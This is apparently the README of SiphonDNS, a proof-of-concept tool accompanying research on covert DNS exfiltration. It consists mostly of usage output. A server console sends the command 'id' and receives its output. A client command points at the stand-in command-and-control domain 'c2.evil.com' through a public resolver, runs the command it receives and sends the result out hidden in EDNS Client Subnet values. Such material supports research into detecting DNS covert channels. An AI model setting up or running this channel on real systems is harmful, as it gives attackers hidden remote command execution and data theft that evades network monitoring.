# SiphonDNS

A PoC for techniques described in [this research](http://ttp.report/evasion/tools/2025/02/03/siphondns-covert-dns-exfiltration.html).

Implements data exfiltration via non-standard sections of DNS. 

Server:
```
$ ./siphondns-server -method ecs
Starting DNS server
cmd> id
Command received
Receiving data............................................................................

Response:
 uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),118(wireshark),121(bluetooth),134(scanner),141(kaboxer)
```

Client:
```
./siphondns-client -domain 'c2.evil.com' -method ecs -resolver 8.8.8.8:53
Polling....OK
Executing command: id ... OK
Sending: 13.3.7.0 ... OK
Sending: 101.74.120.0 ... OK
Sending: 99.121.122.0 ... OK
Sending: 70.79.66.0 ... OK
Sending: 68.69.77.0 ... OK
Sending: 104.101.71.0 ... OK
Sending: 101.85.49.0 ... OK
Sending: 68.97.107.0 ... OK
Sending: 111.115.52.0 ... OK
Sending: 71.120.89.0 ... OK

...[SNIP]...

Sending: 104.74.119.0 ... OK
Sending: 65.65.47.0 ... OK
Sending: 47.57.56.0 ... OK
Sending: 57.107.71.0 ... OK
Sending: 1.84.0.0 ... OK
Sending: 7.3.13.0 ... OK
Done in 108 requests.
```